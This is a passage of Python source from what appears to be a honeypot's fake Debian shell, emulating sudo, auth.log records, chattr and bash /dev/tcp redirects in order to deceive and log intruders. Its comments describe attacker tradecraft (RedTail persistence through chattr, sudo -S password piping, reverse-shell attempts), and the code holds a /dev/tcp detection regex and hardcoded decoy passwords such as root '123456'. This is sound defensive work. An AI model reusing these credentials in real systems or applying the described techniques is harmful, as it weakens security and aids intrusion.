                          "\n".join(lines).encode("latin-1", "replace"))
        return hit

    def _pkg_selection(self, name):
        return self._pkg_selections().get(name, "install")

    @staticmethod
    def _selection_line(name, state):
        """dpkg pads the name with TABS to column 48, not with spaces.

        Measured: "apt" gets six tabs, "base-passwd" five, both landing the
        state at column 48. This printed "%-40s install", which is a
        different number of a different character -- `dpkg --get-selections
        | cat -A` shows it immediately, and so does any diff against a
        second box.
        """
        pad = max(1, (48 - len(name) + 7) // 8)
        return "%s%s%s\n" % (name, "\t" * pad, state)

    @staticmethod
    def _glob_ok(pattern, name):
        import fnmatch
        return fnmatch.fnmatch(name, pattern)

    def _is_sudoer(self, user):
        """Membership of the sudo group, read from /etc/group like sudo does."""
        if user == "root":
            return True
        for line in (self.rawfs.read("/etc/group") or b"").decode(
                "latin-1").splitlines():
            f = line.split(":")
            if len(f) > 3 and f[0] == "sudo":
                return user in [m for m in f[3].split(",") if m]
        return False

    @staticmethod
    def _sudo_version():
        """`sudo -V` -- the banner, and the Configure options line that
        makes it recognisable. Read off a real trixie running the same
        1.9.16p2 this box claims in dpkg."""
        return ("Sudo version 1.9.16p2\n"
                "Configure options: --build=x86_64-linux-gnu --prefix=/usr "
                "--includedir=${prefix}/include --mandir=${prefix}/share/man "
                "--infodir=${prefix}/share/info --sysconfdir=/etc "
                "--localstatedir=/var --disable-option-checking "
                "--disable-silent-rules --libdir=${prefix}/lib/"
                "x86_64-linux-gnu --runstatedir=/run "
                "--disable-maintainer-mode --disable-dependency-tracking "
                "--with-all-insults --with-pam --with-pam-login --with-fqdn "
                "--with-logging=syslog --with-logfac=authpriv --with-devel "
                "--with-env-editor --with-editor=/usr/bin/editor "
                "--with-timeout=15 --with-password-timeout=0 "
                "--with-passprompt=[sudo] password for %p:  "
                "--with-tty-tickets --without-lecture --disable-root-mailer "
                "--with-sendmail=/usr/sbin/sendmail --with-rundir=/run/sudo "
                "--with-sssd --with-sssd-lib=/usr/lib/x86_64-linux-gnu "
                "--enable-zlib=system --enable-admin-flag --with-apparmor "
                "--with-selinux --with-linux-audit "
                "--enable-tmpfiles.d=/usr/lib/tmpfiles.d MVPROG=/bin/mv "
                "--with-exampledir=/usr/share/doc/sudo/examples\n"
                "Sudoers policy plugin version 1.9.16p2\n"
                "Sudoers file grammar version 50\n")

    @staticmethod
    def _sudo_usage():
        return ("sudo - execute a command as another user\n\n"
                "usage: sudo -h | -K | -k | -V\n"
                "usage: sudo -v [-ABkNnS] [-g group] [-h host] [-p prompt] "
                "[-u user]\n"
                "usage: sudo -l [-ABkNnS] [-g group] [-h host] [-p prompt] "
                "[-U user]\n"
                "            [-u user] [command [arg ...]]\n")

    def _sudo_auth_log(self, target, argv, denied=False, badpw=False):
        """Write the three lines sudo writes for every invocation.

        /etc/sudoers here says `Defaults mail_badpass` and sudo is built
        --with-logging=syslog, and the box's own auth.log carries a seeded
        example of the format from deploy restarting nginx. It then logged
        nothing at all for the caller: ten recon bots ran
        `echo '123456' | sudo -S sh -c 'nproc ...'` today and not one of
        them left a line. The file an attacker greps before deciding what
        to clean up is the file that had no record of them.

        Format measured on the guest: two spaces after the pid's colon, a
        TTY field only when there is one, and an opened *and* a closed
        pam_unix line, each invocation with its own pid.
        """
        try:
            path = "/var/log/auth.log"
            node = (self.rawfs.nodes.get(path)
                    or self.rawfs.nodes.get(self.rawfs.resolve(path)))
            if node is None or node.is_dir:
                return
            now = time.time()
            pid = 20000 + int(now * 1000) % 40000
            stamp = time.strftime("%b %e %H:%M:%S", time.localtime(now))
            cmd = " ".join(argv)
            if not cmd.startswith("/"):
                full = self.path_lookup(argv[0]) if argv else None
                cmd = (full + cmd[len(argv[0]):]) if full else cmd
            uid = self._creds_for(self.user)[0] if self.user else 0
            tuid = self._creds_for(target)[0]
            tty = self.vars.get("SSH_TTY", "")
            if badpw:
                # A rejected password is four lines, and it was zero: a
                # successful sudo logged three and a not-in-sudoers refusal
                # logged one, so the single outcome that leaves no trace was
                # the one an attacker most wants to know about. Grepping
                # auth.log after a fumbled sudo and finding nothing is the
                # tell.
                #
                # Message bodies measured on debian:trixie with rsyslog,
                # sudo 1.9.16p2: logname= and rhost= really are empty, there
                # are two spaces between "rhost=" and "user=", and it counts
                # ONE incorrect attempt, not three -- with the password on
                # stdin there is no second line to read. The framing
                # (timestamp, host, sudo[pid]) is the guest's, not the
                # container's, which used rsyslog's RFC3339 template.
                #
                # logname= was empty in both measurements, taken under su
                # and under script; it was not measured over SSH, where it
                # may well carry the login name.
                short = tty.replace("/dev/", "")
                lines = [
                    "%s %s sudo[%d]: pam_unix(sudo:auth): authentication "
                    "failure; logname= uid=%d euid=0 tty=%s ruser=%s "
                    "rhost=  user=%s"
                    % (stamp, HOST, pid, uid, tty, self.user, self.user),
                    "%s %s sudo[%d]: pam_unix(sudo:auth): conversation failed"
                    % (stamp, HOST, pid),
                    "%s %s sudo[%d]: pam_unix(sudo:auth): auth could not "
                    "identify password for [%s]" % (stamp, HOST, pid,
                                                    self.user),
                    "%s %s sudo[%d]:   %s : 1 incorrect password attempt ; "
                    "%sPWD=%s ; USER=%s ; COMMAND=%s"
                    % (stamp, HOST, pid, self.user,
                       ("TTY=%s ; " % short) if tty else "",
                       self.cwd, target, cmd[:400]),
                ]
                node.content = (self.rawfs.read(path) or b"") + (
                    "\n".join(lines) + "\n").encode("latin-1", "replace")
                node.blob = None
                node.mtime = now
                return
            if denied:
                # A refusal is one line, with the reason in place of the
                # session pair, and three spaces before the user.
                node.content = (self.rawfs.read(path) or b"") + (
                    "%s %s sudo[%d]:   %s : %s NOT in sudoers ; %sPWD=%s ; "
                    "USER=%s ; COMMAND=%s\n"
                    % (stamp, HOST, pid, self.user, self.user,
                       ("TTY=%s ; " % tty.replace("/dev/", "")) if tty
                       else "", self.cwd, target, cmd[:400])
                ).encode("latin-1", "replace")
                node.blob = None
                node.mtime = now
                return
            lines = [
                "%s %s sudo[%d]:  %s : %sPWD=%s ; USER=%s ; COMMAND=%s"
                % (stamp, HOST, pid, self.user,
                   ("TTY=%s ; " % tty.replace("/dev/", "")) if tty else "",
                   self.cwd, target, cmd[:400]),
                "%s %s sudo[%d]: pam_unix(sudo:session): session opened for "
                "user %s(uid=%d) by %s(uid=%d)"
                % (stamp, HOST, pid, target, tuid, self.user, uid),
                "%s %s sudo[%d]: pam_unix(sudo:session): session closed for "
                "user %s" % (stamp, HOST, pid, target),
            ]
            node.content = (self.rawfs.read(path) or b"") + (
                "\n".join(lines) + "\n").encode("latin-1", "replace")
            node.blob = None
            node.mtime = now
            node.ctime = max(node.ctime, node.mtime)
        except Exception:                                     # noqa: BLE001
            pass

    #: The passwords this box actually accepts. sudo has to agree with them
    #: or the box contradicts itself three ways: /etc/shadow publishes a real
    #: yescrypt hash of each one, sshd accepts them, and sudo accepted
    #: *anything* -- a wrong password, an empty one, or none at all -- while
    #: its own `sudo -l` reported "(ALL : ALL) ALL" with no NOPASSWD tag,
    #: i.e. that a password was required. An attacker who probes with a
    #: deliberately bogus password and gets root has learned what this is,
    #: and that probe costs them one command.
    #:
    #: Kept here as plaintext rather than verified against the shadow hash at
    #: runtime, so the shell never needs libcrypt to let someone in.
    #: sudopwtest asserts each of these verifies against the hash in
    #: /etc/shadow, so the two cannot drift.
    ACCOUNT_PW = {"root": "123456", "deploy": "deploy123"}

    #: sudo's default timestamp_timeout, in seconds.
    _SUDO_TIMEOUT = 15 * 60

    #: What sudo keeps from the caller under `Defaults env_reset` -- Debian's
    #: compiled-in env_keep list. Anything not here, and not set below, is
    #: dropped. LC_* is a prefix, handled separately.
    _SUDO_ENV_KEEP = ("COLORS", "DISPLAY", "HOSTNAME", "KRB5CCNAME",
                      "LS_COLORS", "PS1", "PS2", "QTDIR", "USERNAME",
                      "LANG", "LANGUAGE", "LINGUAS", "TERM",
                      "XAUTHORITY", "XAUTHORIZATION")

    #: Never preserved, not even under -E. Stripping these is the reason
    #: sudo can be trusted at all: a preserved LD_PRELOAD turns every sudo
    #: into an arbitrary-code-execution primitive, so real sudo removes them
    #: unconditionally and an attacker can check that in one command.
    _SUDO_ENV_NEVER = ("LD_PRELOAD", "LD_LIBRARY_PATH", "LD_AUDIT",
                       "LD_DEBUG", "LD_DEBUG_OUTPUT", "LD_ORIGIN_PATH",
                       "LD_PROFILE", "IFS", "PERL5LIB", "PERL5OPT",
                       "PYTHONPATH", "PYTHONHOME", "BASH_ENV", "ENV",
                       "SHELLOPTS", "BASHOPTS", "GLOBIGNORE", "CDPATH")

    def _sudo_build_env(self, target, caller, preserve, argv):
        """Rebuild the environment the way /etc/sudoers says it is rebuilt.

        The box publishes that file and it says `Defaults env_reset`. sudo
        was not doing it: every variable the caller had went straight
        through, LD_PRELOAD included. Three readers disagreed with one
        written promise -- env_reset, the -E flag (which was indistinguish-
        able from not passing it), and the five SUDO_* variables real sudo
        sets and this one set none of.

        Measured against sudo 1.9.16p2, deploy -> root:

          plain   HOME and MAIL become the TARGET's; USER and LOGNAME become
                  the target; PATH is secure_path; DISPLAY, LANG, LC_*,
                  LS_COLORS, PS1 and TERM survive; everything else goes.
          -E      the caller's HOME, MAIL, PWD, SHLVL and custom variables
                  survive; USER, LOGNAME and PATH still become the target's.
          both    LD_PRELOAD is gone, and SUDO_* is set.

        SSH_CONNECTION surviving a sudo is the cheap tell here: it says the
        environment was never reset without needing LD_PRELOAD at all.
        """
        keep = {}
        if preserve:
            keep = {k: v for k, v in self.vars.items()}
        else:
            for k, v in self.vars.items():
                if k in self._SUDO_ENV_KEEP or k.startswith("LC_"):
                    keep[k] = v
            home = "/root" if target == "root" else "/home/" + target
            keep["HOME"] = home
            keep["MAIL"] = ("/var/mail/%s" % target)
        for k in self._SUDO_ENV_NEVER:
            keep.pop(k, None)
        keep["USER"] = keep["LOGNAME"] = target
        keep["SHELL"] = "/bin/bash"
        # The same constant /etc/sudoers is written from, so the file and
        # the behaviour cannot drift. sudopwtest asserts the file still
        # contains it.
        keep["PATH"] = PATH_ROOT
        # sudo describes the caller, not the target, in these.
        keep["SUDO_USER"] = caller["user"]
        keep["SUDO_UID"] = str(caller["uid"])
        keep["SUDO_GID"] = str(caller["gid"])
        keep["SUDO_HOME"] = caller["home"]
        cmd = " ".join(argv)
        if argv and "/" not in argv[0]:
            full = self.path_lookup(argv[0])
            if full:
                cmd = full + cmd[len(argv[0]):]
        keep["SUDO_COMMAND"] = cmd
        self.vars.clear()
        self.vars.update(keep)
        # sudo builds the child's *environment*, so everything in it is
        # exported by definition. Setting self.vars alone left SUDO_USER
        # visible to the shell and invisible to `printenv`, to `env`, and to
        # any child -- so `sudo sh -c 'echo $SUDO_USER'`, which is how a
        # script actually reads it, saw nothing.
        self.exported = set(keep)

    def _sudo_authenticate(self, nonint, from_stdin, stdin,
                           target=None, argv=None):
        """True if sudo may proceed; writes sudo's own refusal if not.

        Measured on Debian 13, sudo 1.9.16p2:

          root                uid 0 is never prompted, and a password piped
                              in is ignored. Every loader that logs in as
                              root and runs `echo '123456' | sudo -S sh -c`
                              depends on this, so that path is untouched.
          correct via -S      runs, and caches the timestamp
          wrong or empty -S   "Sorry, try again." then EOF -- so sudo
                              reports *one* incorrect attempt, not three,
                              because with -S there is no second line to
                              read. Guessing three here would be the tell.
          -n, uncached        "sudo: a password is required"
          no -S and no tty    "a terminal is required to read the password"
          cached              proceeds without reading stdin at all, so a
                              wrong password after a right one is irrelevant
        """
        if self.uid == 0:
            return True
        if time.time() - getattr(self, "_sudo_ts", 0.0) < self._SUDO_TIMEOUT:
            return True
        if nonint:
            self.err("sudo: a password is required")
            return False
        if not from_stdin:
            self.err("sudo: a terminal is required to read the password; "
                     "either use the -S option to read from standard input "
                     "or configure an askpass helper")
            self.err("sudo: a password is required")
            return False
        given = (stdin or "").split("\n", 1)[0]
        if given and given == self.ACCOUNT_PW.get(self.user):
            self._sudo_ts = time.time()
            return True
        self.err("[sudo] password for %s: Sorry, try again." % self.user)
        self.err("[sudo] password for %s: " % self.user)
        self.err("sudo: no password was provided")
        self.err("sudo: 1 incorrect password attempt")
        self.log(event="sudo_bad_password", user=self.user)
        # auth.log too, or the one outcome that leaves no trace is the one
        # an attacker most wants to check. Only on the command path: the
        # lines a failed `sudo -l` writes were not measured, and the fourth
        # line's shape there is different because there is no COMMAND.
        if argv:
            self._sudo_auth_log(target or "root", argv, badpw=True)
        return False

    def cmd_sudo(self, a, stdin=""):
        """sudo actually elevates now.

        It used to dispatch the command unchanged, so `sudo whoami` printed
        deploy and `sudo cat /etc/shadow` was denied -- on a box whose own
        `id` reports group 27(sudo) and whose `sudo -l` prints
        "(ALL : ALL) ALL" for the asking user. Three statements, two of them
        contradicting the third, on the command every visitor runs first.

        And -l claimed full privileges for *any* user, including the
        www-data a webshell runs as, which is the one identity that must
        never be told it can sudo.
        """
        if not a:
            return "usage: sudo -h | -K | -k | -V\n", 1
        # Flags that take no command at all. These fell through to the
        # dispatcher, which tried to *run* them: `sudo -V` answered
        # "bash: line 1: -V: command not found", naming bash for a flag
        # sudo owns. Anyone checking what they can do starts here.
        if a[0] in ("-V", "--version"):
            return self._sudo_version(), 0
        if a[0] in ("-h", "--help"):
            return self._sudo_usage(), 0
        if a[0] in ("-v", "--validate"):
            if not self._is_sudoer(self.user):
                self.err("Sorry, user %s may not run sudo on %s."
                         % (self.user, HOST))
                return "", 1
            # Root needs no password, so validating the timestamp prints
            # nothing and succeeds.
            return "", 0
        if a[0] in ("-K", "--remove-timestamp"):
            return "", 0
        target = "root"
        i = 0
        # -k and -K are complete on their own: they drop the cached
        # timestamp and exit 0 without running anything. Every other option
        # here still needs a command after it.
        standalone = False
        # -n and -S decide *how* sudo may ask for a password, so they cannot
        # be consumed and forgotten.
        nonint = from_stdin = preserve_env = False
        while i < len(a):
            if a[i] in ("-n", "-S", "-k", "-H", "-E", "-b"):
                if a[i] in ("-k", "-K"):
                    standalone = True
                    # -k drops the cached timestamp, which is the whole
                    # reason a script runs it before re-authenticating.
                    self._sudo_ts = 0.0
                if a[i] == "-n":
                    nonint = True
                elif a[i] == "-S":
                    from_stdin = True
                elif a[i] in ("-E", "--preserve-env"):
                    preserve_env = True
                i += 1
            elif a[i] in ("-u", "--user") and i + 1 < len(a):
                target = a[i + 1]
                i += 2
            elif a[i].startswith("--user="):
                target = a[i].split("=", 1)[1]
                i += 1
            elif a[i] == "--":
                # End of sudo's own options; everything after is the command.
                # It fell through to the else and became the command itself,
                # so `sudo -- bash x.sh` answered "sudo: --: command not
                # found" -- and `--` is exactly what a script writer reaches
                # for when the command might begin with a dash.
                i += 1
                break
            else:
                break
        a = a[i:]
        # Options can consume every argument and leave no command, and that
        # is still "sudo with nothing to run". Bare `sudo` printed the usage
        # line and exited 1 while `sudo --` and `sudo -u deploy` printed
        # nothing and exited 0 -- three spellings of one situation, one of
        # which was right.
        if not a and not standalone:
            return "usage: sudo -h | -K | -k | -V\n", 1
        # -V and -h are only recognised above, where they have to be the
        # first argument. Reached here they fell through to the dispatcher,
        # which answered "sudo: -V: command not found" -- sudo naming its own
        # option as a missing command, which is the leak rather than the
        # wrong exit code. Measured: real sudo rejects the combination with
        # its usage line and rc 1, because -V and -h are exclusive of every
        # other option.
        #
        # Known gap, measured only once so not generalised: `sudo -H -l` is
        # also a usage error on a real box, and -l is accepted here with any
        # flag. Establishing which flags -l and -v tolerate needs the whole
        # exclusivity matrix measured, not one data point extrapolated.
        if a and a[0] in ("-V", "--version", "-h", "--help"):
            return "usage: sudo -h | -K | -k | -V\n", 1
        # -v is a mode too, and unlike -V it tolerates -n: measured,
        # `sudo -n -v` answers "sudo: a password is required" rather than a
        # usage error. It was reaching the dispatcher and answering
        # "sudo: -v: command not found".
        if a and a[0] in ("-v", "--validate"):
            if not self._is_sudoer(self.user):
                self.err("Sorry, user %s may not run sudo on %s."
                         % (self.user, HOST))
                return "", 1
            if not self._sudo_authenticate(nonint, from_stdin, stdin):
                return "", 1
            return "", 0
        allowed = self._is_sudoer(self.user)

        if a and a[0] == "-l":
            if not allowed:
                self.err("Sorry, user %s may not run sudo on %s."
                         % (self.user, HOST))
                return "", 1
            if not self._sudo_authenticate(nonint, from_stdin, stdin):
                return "", 1
            # use_pty is in /etc/sudoers, so it has to be in the list sudo
            # prints -- the file and the command are two readings of one
            # configuration. It appeared in the file only when the sketched
            # sudoers was replaced by the guest's real one.
            return ("Matching Defaults entries for %s on web01:\n"
                    "    env_reset, mail_badpass,\n"
                    "    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n"
                    "    use_pty\n\n"
                    "User %s may run the following commands on web01:\n"
                    "    (ALL : ALL) ALL\n" % (self.user, self.user), 0)
        if not a:
            return "", 0
        if not allowed:
            self.err("%s is not in the sudoers file.  This incident will be "
                     "reported." % self.user)
            self.log(event="sudo_denied", user=self.user,
                     command=" ".join(a)[:400])
            # "This incident will be reported" is sudo saying it wrote a
            # log line, and it wrote none. The field layout is the guest's,
            # measured on a refusal; the phrase is the one our own message
            # names.
            self._sudo_auth_log(target, a, denied=True)
            return "", 1

        if not self._sudo_authenticate(nonint, from_stdin, stdin,
                                       target=target, argv=a):
            self.log(event="sudo_auth_failed", user=self.user,
                     command=" ".join(a)[:400])
            return "", 1
        self.log(event="sudo", user=self.user, target=target,
                 command=" ".join(a)[:400])
        self._sudo_auth_log(target, a)
        uid, gid, groups = self._creds_for(target)
        _caller = {"user": self.user, "uid": self.uid, "gid": self.gid,
                   "home": self.vars.get(
                       "HOME", "/root" if self.uid == 0
                       else "/home/" + self.user)}
        saved = (self.user, self.uid, self.gid, self.fs, dict(self.vars),
                 set(self.exported))
        self.user, self.uid, self.gid = target, uid, gid
        self.fs = self.rawfs if uid == 0 else CredFS(self.rawfs, uid, gid,
                                                     groups)
        self._sudo_build_env(target, _caller, preserve_env, a)
        try:
            # A command sudo cannot find is sudo's error, not the shell's.
            # This fell through to dispatch, which answered
            # "bash: line 1: foo: command not found" with status 127 --
            # naming bash for a lookup sudo did, and giving the shell's
            # exit code where sudo uses 1. The same program-name leak the
            # lzma family had.
            if "/" in a[0]:
                missing = not self.fs.exists(VFS.norm(a[0], self.cwd))
            else:
                # sudo execs a binary: it cannot see a shell function, so
                # `f(){ :; }; sudo f` is a command-not-found on a real box
                # even though the caller's own shell would run it.
                missing = (
                    not hasattr(self, "cmd_" + a[0].replace("-", "_"))
                    and a[0] not in getattr(self.fs, "stock_bins", ())
                    and not self.fs.exists("/usr/bin/" + a[0])
                    and not self.fs.exists("/usr/sbin/" + a[0])
                    and not self.fs.exists("/bin/" + a[0]))
            if missing:
                self.err("sudo: %s: command not found" % a[0])
                return "", 1
            return self.dispatch(a[0], a[1:], stdin)
        finally:
            (self.user, self.uid, self.gid, self.fs, _env, _exp) = saved
            self.vars.clear()
            self.vars.update(_env)
            self.exported = _exp

    def cmd_run_parts(self, a, stdin=""):
        """run-parts, because /etc/profile calls it on every login shell.

        Debian's /etc/profile ends with

            for i in $(run-parts --list --regex '...\\.sh$' /etc/profile.d)

        and run-parts was declared in debianutils' file list without being
        implemented, so it fell through to the generic stub and answered with
        its own version and usage. That went unnoticed for as long as
        /etc/profile was a sketch that never called it: replacing the sketch
        with the real file is what exposed the gap. `bash -lc id` printed the
        uid and then run-parts' usage after it.

        Measured on the guest: --list prints full paths, one per line,
        sorted; no matches is no output and rc 0; without --regex the
        default LSB name rule applies; a bad option goes to stderr with
        rc 1.
        """
        import re as _re
        listing = testing = False
        regex = None
        args = []
        i = 0
        while i < len(a):
            x = a[i]
            if x in ("--list", "-l"):
                listing = True
            elif x == "--test":
                testing = True
            elif x == "--regex":
                regex = a[i + 1] if i + 1 < len(a) else ""
                i += 1
            elif x.startswith("--regex="):
                regex = x.split("=", 1)[1]
            elif x in ("--report", "-v", "--verbose", "--exit-on-error",
                       "--new-session", "--reverse", "--lsbsysinit"):
                pass
            elif x in ("-a", "--arg", "-u", "--umask"):
                i += 1
            elif x.startswith("--arg=") or x.startswith("--umask="):
                pass
            elif x.startswith("-"):
                self.err("run-parts: unrecognized option '%s'" % x)
                self.err("Usage: run-parts [OPTION]... [FILE]...")
                return "", 1
            else:
                args.append(x)
            i += 1
        if not args:
            self.err("run-parts: missing operand")
            self.err("Usage: run-parts [OPTION]... [FILE]...")
            return "", 1
        d = VFS.norm(args[-1], self.cwd)
        if not self.fs.isdir(d):
            self.err("run-parts: failed to open directory %s: "
                     "No such file or directory" % args[-1])
            return "", 1
        # Without --regex, run-parts uses the LSB namespace rule: letters,
        # digits, underscores and hyphens only. That is why a file called
        # `backup.sh` is skipped by cron and `backup` is not.
        pat = _re.compile(regex) if regex else _re.compile(r"^[a-zA-Z0-9_-]+$")
        names = []
        for nm in sorted(self.fs.listdir(d) or []):
            if not pat.search(nm) if regex else not pat.match(nm):
                continue
            full = d.rstrip("/") + "/" + nm
            if self.fs.isdir(full):
                continue
            names.append(full)
        if listing or testing:
            return "".join(n + "\n" for n in names), 0
        out = []
        for full in names:
            node = self.fs.nodes.get(full) or self.fs.nodes.get(
                self.fs.resolve(full))
            if node is None or not (getattr(node, "mode", 0) & 0o111):
                continue
            body, _rc = self.dispatch(full, [], "")
            out.append(body)
        return "".join(out), 0

    def cmd_mktemp(self, a, stdin=""):
        name = "/tmp/tmp.%s" % "".join(random.choice(
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")
            for _ in range(10))
        if "-d" in a:
            self.fs.mkdir(name)
        else:
            self.fs.write(name, b"", mode=0o600)
        return name + "\n", 0

    # 22 positions, as e2fsprogs prints them: `lsattr /etc/hostname` on
    # the guest gives "--------------e-------" and a +i file gives
    # "----i-----------------", which fixes i at 4, a at 5 and e at 14.
    _CHATTR_ORDER = "suSDiadAcEjItTehCFNPVm"

    _NETDEV = re.compile(r"^/dev/(tcp|udp)/([^/]+)/(\d+)$")

    def _net_redirect(self, path, spelled):
        """bash opens /dev/tcp/HOST/PORT as a socket. Handle it, but never
        connect.

        It was answering "No such file or directory", which is what a shell
        *without* net redirections says -- dash, or a bash built with
        --disable-net-redirections. Debian's bash has them, so an actor
        testing `> /dev/tcp/...` learned this was not bash, and the
        destination of the attempt -- a C2 address, which is the single
        most useful thing a reverse shell hands us -- went unrecorded.

        Emulated as refused rather than attempted: the honeypot does not
        make outbound connections on an attacker's behalf, and a refused
        C2 is the commonest real outcome anyway. UDP is connectionless and
        succeeds quietly, as it does on the guest.
        """
        m = self._NETDEV.match(path)
        if not m:
            return None
        proto, host, port = m.group(1), m.group(2), m.group(3)
        self.log(event="net_redirect", proto=proto, host=host,
                 port=int(port), target="%s:%s" % (host, port),
                 spelled=spelled)
        if proto == "udp":
            return 0
        self.err("bash: connect: Connection refused")
        self.err("bash: %s%s: Connection refused" % (self.where(), spelled))
        return 1

    def _resolve_fd_path(self, path, mode):
        """(path, mode) after following /dev/fd/N to what exec opened.

        Writing to a descriptor opened earlier appends to it -- the file
        was truncated when exec opened it, not on every write."""
        m = re.fullmatch(r"/dev/fd/(\d+)", path or "")
        if not m:
            return path, mode
        num = int(m.group(1))
        # A process substitution already owns some of these names --
        # `echo x > >(cat)` becomes /dev/fd/63 -- and that machinery
        # writes the file itself. Only descriptors this shell opened, and
        # the ones it never had, are ours to answer for.
        if any(path == sink for sink, _cmd in
               getattr(self, "_procsub_sinks", ())):
            return path, mode
        target = getattr(self, "fds", {}).get(num)
        if target is None:
            if num in (0, 1, 2):
                return path, mode
            self.err("bash: %s%d: Bad file descriptor" % (self.where(), num))
            return None, mode
        return target, "a"

    def _noclobber_refused(self, path, spelled, mode):
        """True when `set -o noclobber` forbids this truncating redirect.

        The option was accepted and inert, so `set -C` -- which careful
        installer scripts set precisely so a stray `>` cannot destroy a
        file -- changed nothing. `>|` overrides it, which is the whole
        reason that spelling exists.
        """
        if mode != "w":
            return False
        if self.set_opts.get("noclobber") != "on":
            return False
        if not self.fs.exists(path):
            return False
        self.err("bash: %s%s: cannot overwrite existing file"
                 % (self.where(), spelled))
        return True

    def _redirect_open(self, path, spelled):
        """None if this is an ordinary file; an rc if the target is special
        and has already been dealt with."""
        return self._net_redirect(path, spelled)

    def _deny_reason(self, path):
        """"Operation not permitted" or "No such file or directory".

        Every writer had its own literal, and they all said the file did not
        exist. An immutable or append-only file plainly does exist -- `ls -l`
        lists it and `cat` reads it -- so `cp` and `tee` claiming otherwise
        was two commands on one box disagreeing about whether a file is
        there. Measured on the guest: cp, tee, dd, truncate and bash's own
        redirect all say "Operation not permitted", each in its own wording.
        """
        node = self.fs.nodes.get(path) or self.fs.nodes.get(
            self.fs.resolve(path))
        if getattr(self.fs, "_write_denied", False) or (
                node is not None
                and ({"i", "a"} & set(getattr(node, "attrs", ())))):
            return "Operation not permitted"
        return "No such file or directory"

    def _write_fail(self, path, spelled):
        """Report why a redirect could not write.

        Every site said "No such file or directory". An immutable file is a
        different failure -- the kernel returns EPERM and bash prints
        Operation not permitted -- and telling them apart matters because a
        loader that has just run `chattr +i` on its own key checks that the
        file cannot be overwritten. Saying the file does not exist tells it
        the opposite of the truth.
        """
        node = self.fs.nodes.get(path)
        # +a refuses a truncating redirect for the same reason and with the
        # same errno, so ask the VFS what it actually refused on rather
        # than re-deriving one attribute's worth of the rule here.
        if getattr(self.fs, "_write_denied", False) or (
                node is not None
                and ({"i", "a"} & set(getattr(node, "attrs", ())))):
            self.err("bash: %s%s: Operation not permitted"
                     % (self.where(), spelled))
        else:
            self.err("bash: %s%s: No such file or directory"
                     % (self.where(), spelled))
        return 1

    def cmd_chattr(self, a, stdin=""):
        """Set ext2 attributes. Both RedTail staging scripts use this.

        It was an unimplemented stock binary, so `chattr -ia` answered
        "missing operand" -- and clean.sh calls it on every cron file it
        wants to edit, while the loader calls `chattr +ai` on the ssh key it
        just planted. Getting it wrong meant the persistence step read as
        broken and the immutable bit never meant anything.
        """
        mode, flags, files, recursive = None, "", [], False
        for x in a:
            if x in ("-R", "--recursive"):
                recursive = True
            elif x in ("-V", "-f"):
                continue
            elif x and x[0] in "+-=" and len(x) > 1 and not os.path.sep in x:
                mode, flags = x[0], x[1:]
            else:
                files.append(x)
        if mode is None or not files:
            self.err("chattr: missing operand")
            self.err("Try 'chattr --help' for more information.")
            return "", 1
        bad = [c for c in flags if c not in self._CHATTR_ORDER]
        if bad:
            self.err("chattr: Unknown attribute(s) in %s%s" % (mode, flags))
            return "", 1
        rc = 0
        for f in files:
            path = VFS.norm(f, self.cwd)
            node = (self.fs.nodes.get(path)
                    or self.fs.nodes.get(self.fs.resolve(path)))
            if node is None:
                self.err("chattr: No such file or directory while trying to "
                         "stat %s" % f)
                rc = 1
                continue
            # -R descends. The real chattr sets the flag on the directory
            # and on every file and subdirectory beneath it -- measured on
            # the guest -- and this applied it only to the name given. So
            # `chattr -R +i /usr/bin`, which is the last thing the miner
            # installer runs, left every binary in there writable: the
            # directory lock stopped names being added or removed, and
            # `echo pwned > /usr/bin/curl` still went through, which the
            # real flag exists to prevent.
            # The primary target keeps the node already resolved above --
            # /bin/ps is reached through the merged-/usr symlink and is not
            # a key in nodes, so re-looking it up by name here found
            # nothing and silently set no attribute at all. tampertest
            # caught it: `chattr +i /bin/ps` then `lsattr` from either
            # spelling showed the flag missing.
            targets = [(path, node)]
            if recursive and node.is_dir:
                targets += [(k, self.fs.nodes.get(k))
                            for k in self.fs.node_paths()
                            if k.startswith(path.rstrip("/") + "/")]
            for tpath, tnode in targets:
                if tnode is None:
                    continue
                tcur = set(getattr(tnode, "attrs", set()))
                if mode == "+":
                    tcur |= set(flags)
                elif mode == "-":
                    tcur -= set(flags)
                else:
                    tcur = set(flags)
                tnode.attrs = tcur
                self.fs._record(("a", tpath, "".join(sorted(tcur))),
                                len(tpath))
            cur = set(getattr(node, "attrs", set()))
            # Journalled, so it comes back with the file. The attributes
            # were the one thing about an attacker's file that did not
            # survive a restart: the bytes returned from the replay, the
            # mode returned, and the +i did not -- so a returning actor
            # found the flag they had set gone and `rm` working again. The
            # honeypot has restarted twenty times this month, so this was
            # not hypothetical. RedTail's setup.sh runs `chattr -ia` first
            # precisely because it expects the flag to be there.

            if "i" in set(flags) and mode in ("+", "="):
                self.log(event="persistence_write", kind="immutable",
                         path=path, via="chattr", content=mode + flags)
        return "", rc

    def cmd_lsattr(self, a, stdin=""):
        files = [x for x in a if not x.startswith("-")] or ["."]
        out, rc = [], 0
        for f in files:
            path = VFS.norm(f, self.cwd)
            node = (self.fs.nodes.get(path)
                    or self.fs.nodes.get(self.fs.resolve(path)))
            if node is None:
                self.err("lsattr: No such file or directory while trying to "
                         "stat %s" % f)
                rc = 1
                continue
            attrs = getattr(node, "attrs", set())
            # ext4 shows 'e' (extents) on essentially every file.
            shown = attrs | {"e"}
            line = "".join(c if c in shown else "-"
                           for c in self._CHATTR_ORDER)
            out.append("%s %s\n" % (line, f))
        return "".join(out), rc

    def cmd_openssl(self, a, stdin=""):
        # `openssl rand` is the first thing the RedTail loader reaches for
        # when it needs a random filename; returning nothing sent it down
        # its /dev/urandom fallback. Anything that asks for randomness and
        # gets an empty string learns something about the box.
        if a and a[0] == "rand":
            enc, count = None, 0
            for i, x in enumerate(a[1:], 1):
                if x in ("-base64", "-hex"):
                    enc = x[1:]
                elif x.lstrip("-").isdigit():
                    count = int(x.lstrip("-"))
            if count <= 0:
                self.err("Missing number of random bytes")
                return "", 1
            if count > 1 << 20:
                self.err("Invalid number of bytes")
                return "", 1
            raw = bytes(random.getrandbits(8) for _ in range(count))
            if enc == "hex":
                return raw.hex() + "\n", 0
            if enc == "base64":
                # OpenSSL wraps base64 output at 64 characters.
                b = base64.b64encode(raw).decode()
                return "\n".join(b[i:i + 64]
                                  for i in range(0, len(b), 64)) + "\n", 0
